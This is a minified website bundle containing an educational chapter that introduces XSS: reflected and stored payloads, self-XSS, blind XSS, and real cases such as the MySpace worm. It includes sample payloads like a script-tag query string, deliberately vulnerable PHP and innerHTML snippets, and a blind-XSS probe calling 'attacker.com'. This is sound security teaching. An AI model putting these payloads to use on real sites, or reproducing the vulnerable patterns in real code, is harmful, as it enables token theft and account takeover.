"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[966],{3905:(e,t,n)=>{n.d(t,{Zo:()=>h,kt:()=>m});var a=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function r(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):r(r({},t),e)),n},h=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,l=e.parentName,h=s(e,["components","mdxType","originalType","parentName"]),p=c(n),u=i,m=p["".concat(l,".").concat(u)]||p[u]||d[u]||o;return n?a.createElement(m,r(r({ref:t},h),{},{components:n})):a.createElement(m,r({ref:t},h))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,r=new Array(o);r[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[p]="string"==typeof e?e:i,r[1]=s;for(var c=2;c<o;c++)r[c]=n[c];return a.createElement.apply(null,r)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},8685:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>r,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var a=n(7462),i=(n(7294),n(3905));const o={sidebar_position:3},r="Starting with XSS for Frontend Security",s={unversionedId:"ch1/xss-introduction",id:"ch1/xss-introduction",title:"Starting with XSS for Frontend Security",description:'In the preface of the first article, I mentioned that frontend security is not just about XSS, there are many interesting things to explore. However, XSS itself is quite fascinating and is commonly known as "frontend security". So, let\'s start with XSS as it is an essential topic that can teach you some things you may not have noticed before.',source:"@site/i18n/en/docusaurus-plugin-content-docs/current/ch1/03-xss-introduction.md",sourceDirName:"ch1",slug:"/ch1/xss-introduction",permalink:"/beyond-xss/en/ch1/xss-introduction",draft:!1,tags:[],version:"current",sidebarPosition:3,frontMatter:{sidebar_position:3},sidebar:"tutorialSidebar",previous:{title:"Browser Security Model",permalink:"/beyond-xss/en/ch1/browser-security-model"},next:{title:"Understanding XSS a Bit More",permalink:"/beyond-xss/en/ch1/know-xss-a-bit-more"}},l={},c=[{value:"The Origin of XSS",id:"the-origin-of-xss",level:2},{value:"What is XSS? What can it do?",id:"what-is-xss-what-can-it-do",level:2},{value:"Sources of XSS",id:"sources-of-xss",level:2},{value:"1. How the content is placed on the page",id:"1-how-the-content-is-placed-on-the-page",level:3},{value:"2. Whether the payload is stored",id:"2-whether-the-payload-is-stored",level:3},{value:"Self-XSS",id:"self-xss",level:3},{value:"Blind XSS",id:"blind-xss",level:2},{value:"Conclusion",id:"conclusion",level:2}],h={toc:c},p="wrapper";function d(e){let{components:t,...o}=e;return(0,i.kt)(p,(0,a.Z)({},h,o,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"starting-with-xss-for-frontend-security"},"Starting with XSS for Frontend Security"),(0,i.kt)("p",null,'In the preface of the first article, I mentioned that frontend security is not just about XSS, there are many interesting things to explore. However, XSS itself is quite fascinating and is commonly known as "frontend security". So, let\'s start with XSS as it is an essential topic that can teach you some things you may not have noticed before.'),(0,i.kt)("p",null,'From this point onwards, let\'s officially dive into the first chapter: "Starting with XSS".'),(0,i.kt)("h2",{id:"the-origin-of-xss"},"The Origin of XSS"),(0,i.kt)("p",null,"In 2009, Microsoft's MSDN blog published an article titled ",(0,i.kt)("a",{parentName:"p",href:"https://web.archive.org/web/20100723152801/http://blogs.msdn.com/b/dross/archive/2009/12/15/happy-10th-birthday-cross-site-scripting.aspx"},"Happy 10th birthday Cross-Site Scripting!"),", indicating that XSS was born around 1999, which was in the previous century."),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(3111).Z,width:"1586",height:"1398"})),(0,i.kt)("p",null,'Although the article ends with a statement hoping for the "death" of XSS ten years later rather than its birth:'),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Let\u2019s hope that ten years from now we\u2019ll be celebrating the death, not the birth, of Cross-Site Scripting!")),(0,i.kt)("p",null,"We all know that even after 20 years, XSS remains a popular vulnerability. From unknown small company websites to well-known giants like Facebook or Google, XSS vulnerabilities occasionally appear. This indicates that defending against this attack is not an easy task."),(0,i.kt)("p",null,"Now, let's take a look at what XSS is."),(0,i.kt)("h2",{id:"what-is-xss-what-can-it-do"},"What is XSS? What can it do?"),(0,i.kt)("p",null,"XSS stands for Cross-site scripting. It is not called CSS because CSS already stands for Cascading Style Sheets."),(0,i.kt)("p",null,'From today\'s perspective, the name XSS may not be entirely accurate because many XSS attacks are not limited to being "Cross-site". I will explain the difference between "site" and "origin" later in this series. This is crucial knowledge in frontend security.'),(0,i.kt)("p",null,"In simple terms, XSS allows attackers to execute JavaScript code on other people's websites."),(0,i.kt)("p",null,"For example, suppose there is a website written like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},"<?php\n echo \"Hello, \" . $_GET['name'];\n?>\n")),(0,i.kt)("p",null,"If I visit ",(0,i.kt)("inlineCode",{parentName:"p"},"index.php?name=huli"),', the page will display "Hello, huli", which seems normal.'),(0,i.kt)("p",null,"But what if I visit ",(0,i.kt)("inlineCode",{parentName:"p"},"index.php?name=<script>alert(1)<\/script>"),"? The output will become:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},"Hello, <script>alert(1)<\/script>\n")),(0,i.kt)("p",null,"The content inside ",(0,i.kt)("inlineCode",{parentName:"p"},"<script>")," will be treated as JavaScript code and executed. An alert window will pop up on the screen, indicating that I can execute JavaScript code on other people's websites."),(0,i.kt)("p",null,"Although most XSS examples demonstrate the execution of ",(0,i.kt)("inlineCode",{parentName:"p"},"alert(1)")," to prove the code execution capability, do not assume that XSS is limited to this. It is just for demonstration purposes."),(0,i.kt)("p",null,"Once XSS is achieved, it means that code can be executed on someone else's website, allowing for various actions. For example, stealing everything stored in ",(0,i.kt)("inlineCode",{parentName:"p"},"localStorage"),", which may include authentication tokens. With the stolen token, one can log into the website using someone else's identity."),(0,i.kt)("p",null,"This is why some people advocate storing authentication tokens in cookies rather than ",(0,i.kt)("inlineCode",{parentName:"p"},"localStorage"),". ",(0,i.kt)("inlineCode",{parentName:"p"},"localStorage")," can be stolen, but if the cookie has the ",(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," flag, it cannot be accessed. Therefore, it cannot be stolen."),(0,i.kt)("p",null,"If a website does not use the ",(0,i.kt)("inlineCode",{parentName:"p"},"HttpOnly")," flag, one can use ",(0,i.kt)("inlineCode",{parentName:"p"},"document.cookie")," or the updated ",(0,i.kt)("inlineCode",{parentName:"p"},"cookieStore")," API to retrieve the website's cookies. Even if stealing is not possible, one can directly use ",(0,i.kt)("inlineCode",{parentName:"p"},"fetch()")," to call APIs and see what functionalities can be manipulated on the website."),(0,i.kt)("p",null,"For example, let's say YouTube has an XSS vulnerability. Attackers can exploit this vulnerability to add or delete videos, steal viewing history and other data, and perform almost any action that a normal user can do."),(0,i.kt)("p",null,"Have you ever wondered why many websites require re-entering the current password when changing passwords? Haven't we already logged in? Why do we need to enter it again? Do I not know my own password when changing it?"),(0,i.kt)("p",null,"You definitely know your own password, but attackers don't."),(0,i.kt)("p",null,"In the case of the password change feature, the backend may provide an API called ",(0,i.kt)("inlineCode",{parentName:"p"},"/updatePassword"),", which requires the ",(0,i.kt)("inlineCode",{parentName:"p"},"currentPassword")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"newPassword")," parameters. After authentication, the password can be changed."),(0,i.kt)("p",null,"Even if an attacker finds and exploits an XSS vulnerability, they cannot change your password because they don't know what your current password is."),(0,i.kt)("p",null,"On the other hand, if the ",(0,i.kt)("inlineCode",{parentName:"p"},"currentPassword")," is not required when changing the password, an attacker can directly change your password through XSS and take over your entire account. The auth token obtained through XSS has a time limit and will expire, but if the attacker changes your password directly, they can use your account credentials to log in openly."),(0,i.kt)("p",null,"Therefore, many sensitive operations require re-entering the password or even having a second password, one of the purposes being to defend against this situation."),(0,i.kt)("h2",{id:"sources-of-xss"},"Sources of XSS"),(0,i.kt)("p",null,"The reason why XSS issues exist is that user input is directly displayed on the page, allowing users to input malicious payloads and inject JavaScript code."),(0,i.kt)("p",null,"You may have heard of several classifications of XSS, such as Reflect, Persistent, and DOM-based, but these classification methods have been around for over twenty years and may not be suitable for today's context. Therefore, I believe XSS can be viewed from two perspectives."),(0,i.kt)("h3",{id:"1-how-the-content-is-placed-on-the-page"},"1. How the content is placed on the page"),(0,i.kt)("p",null,"For example, in the PHP example mentioned earlier, the attacker's content is directly outputted on the backend, so when the browser receives the HTML, it already contains the XSS payload."),(0,i.kt)("p",null,"Here's another example. Below is an HTML file:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-html"},"<div>\n  Hello, <span id=\"name\"></span>\n</div>\n<script>\n  const qs = new URLSearchParams(window.location.search)\n  const name = qs.get('name')\n  document.querySelector('#name').innerHTML = name\n<\/script>\n")),(0,i.kt)("p",null,"Similarly, we can inject any content we want by using ",(0,i.kt)("inlineCode",{parentName:"p"},"index.html?name=<script>alert(1)<\/script>"),", but this time the content is outputted from the frontend using ",(0,i.kt)("inlineCode",{parentName:"p"},"innerHTML")," to add our payload to the page."),(0,i.kt)("p",null,"What's the difference?"),(0,i.kt)("p",null,"The difference is that the example above will not trigger the alert because when using ",(0,i.kt)("inlineCode",{parentName:"p"},"innerHTML"),", the inserted ",(0,i.kt)("inlineCode",{parentName:"p"},"<script>")," has no effect. Therefore, the attacker must adjust the XSS payload to execute the code."),(0,i.kt)("h3",{id:"2-whether-the-payload-is-stored"},"2. Whether the payload is stored"),(0,i.kt)("p",null,"The examples mentioned earlier directly present the content from the query string on the page, so the payload of the attack is not stored anywhere."),(0,i.kt)("p",null,"So, if we want to attack, we must find a way to make the target click on the link with the XSS payload to trigger our attack. Of course, other methods can be used or combined to lower this threshold, such as using shortened URLs to hide any anomalies."),(0,i.kt)("p",null,"In this situation, basically your attack target is this one person."),(0,i.kt)("p",null,"There is another situation that is relatively simple, such as a comment board. Assuming HTML code can be inserted into the comments without any filtering, we can leave a content with ",(0,i.kt)("inlineCode",{parentName:"p"},"<script>")," tags. As a result, anyone viewing this comment board will be attacked, and your attack target is all users, expanding the scope of impact."),(0,i.kt)("p",null,"Just think about it, if Facebook posts had an XSS vulnerability, everyone who saw the post would be attacked. It could even become wormable, meaning it can self-replicate like a worm, using XSS to help victims post, resulting in more people being attacked."),(0,i.kt)("p",null,"In a 2008 OWASP paper titled ",(0,i.kt)("a",{parentName:"p",href:"https://owasp.org/www-pdf-archive/OWASP-AppSecEU08-Dabirsiaghi.pdf"},"Building and Stopping Next Generation XSS Worms"),", several worm XSS cases were mentioned."),(0,i.kt)("p",null,"The most famous real case is MySpace, a well-known social networking site in 2005. A 19-year-old named Samy Kamkar found an XSS vulnerability on the profile page. He used the vulnerability to make victims add him as a friend and then injected XSS payloads into their profiles. As a result, within 18 hours, over 1 million users were infected, causing MySpace to temporarily shut down the website to remove these infected profiles."),(0,i.kt)("p",null,"This case demonstrates the impact of worm XSS."),(0,i.kt)("p",null,'In addition to classifying XSS based on the "source of the payload," there are other ways to classify XSS. Below, I will introduce two additional types of XSS classifications, although they are less common, it\'s still good to know about them.'),(0,i.kt)("h3",{id:"self-xss"},"Self-XSS"),(0,i.kt)("p",null,'Self-XSS actually has two interpretations. The first is "attacking oneself," for example, opening the developer tools of a webpage and pasting JavaScript code by oneself, which is a form of self-XSS. Some websites specifically warn against doing this, like Facebook:'),(0,i.kt)("p",null,(0,i.kt)("img",{src:n(6007).Z,width:"977",height:"295"})),(0,i.kt)("p",null,'The second interpretation is "XSS that can only attack oneself," which is usually referred to as self-XSS.'),(0,i.kt)("p",null,"The XSS we discussed earlier was all about attacking others because others can see your payload. However, sometimes only you can see it."),(0,i.kt)("p",null,"Let's take an example. Suppose there is an XSS vulnerability in the phone number field, but the problem is that the phone number is personal information, so only you can see it on your own settings page. Others cannot see it. This kind of situation is called self-XSS, where only you can see the pop-up window of ",(0,i.kt)("inlineCode",{parentName:"p"},"alert()")," when you open the settings page."),(0,i.kt)("p",null,"Although it may seem useless, when combined with other vulnerabilities, it is possible for others to see it."),(0,i.kt)("h2",{id:"blind-xss"},"Blind XSS"),(0,i.kt)("p",null,'Blind XSS means "XSS executed in a place and at a time you cannot see."'),(0,i.kt)("p",null,"Let's give another example. Suppose there is an e-commerce platform, and after testing, you find that there are no issues in any field and no XSS vulnerabilities are found. However, the e-commerce platform has an internal portal where all order data can be viewed, and this portal has a vulnerability. They forgot to encode the name field, so XSS can be executed using the name field."),(0,i.kt)("p",null,"In this case, we usually wouldn't know during testing because I don't have access to the internal system, and I may not even know it exists. To test this situation, you need to change the content of the XSS payload from ",(0,i.kt)("inlineCode",{parentName:"p"},"alert()")," to a payload that sends a packet, such as ",(0,i.kt)("inlineCode",{parentName:"p"},"fetch('https://attacker.com/xss')"),". This way, when the XSS is triggered in an invisible place, it can be observed from the server."),(0,i.kt)("p",null,"There are some ready-made services like ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/mandatoryprogrammer/xsshunter-express"},"XSS Hunter")," that provide a platform for you to conveniently observe whether XSS is triggered. If triggered, it will return the triggered URL and other information on the screen."),(0,i.kt)("p",null,"Speaking of actual cases, rioncool22 reported a vulnerability to Shopify in 2020: ",(0,i.kt)("a",{parentName:"p",href:"https://hackerone.com/reports/948929"},"Blind Stored XSS Via Staff Name"),". They added an employee in Shopify's merchant portal and inserted an XSS payload in the name field. Although it did not trigger in the Shopify merchant portal, it triggered in Shopify's internal portal, and they received a reward of $3000."),(0,i.kt)("h2",{id:"conclusion"},"Conclusion"),(0,i.kt)("p",null,"This article is a basic introduction to XSS, mainly focusing on the impact and causes of XSS, and also introducing the two categories of self-XSS and blind XSS."),(0,i.kt)("p",null,"This is just the beginning of XSS. In the next article, we will continue to explore and see more different aspects of XSS."),(0,i.kt)("p",null,"Before moving on to the next article, think about what payload you would use to trigger XSS if you find an injection point like ",(0,i.kt)("inlineCode",{parentName:"p"},"innerHTML = data"),"."))}d.isMDXComponent=!0},3111:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/03-01-e0b5cee88d2be2046ba1ad60c8445c9a.png"},6007:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/03-02-f61149cb8a78f8e995e3dc22a54e1014.png"}}]);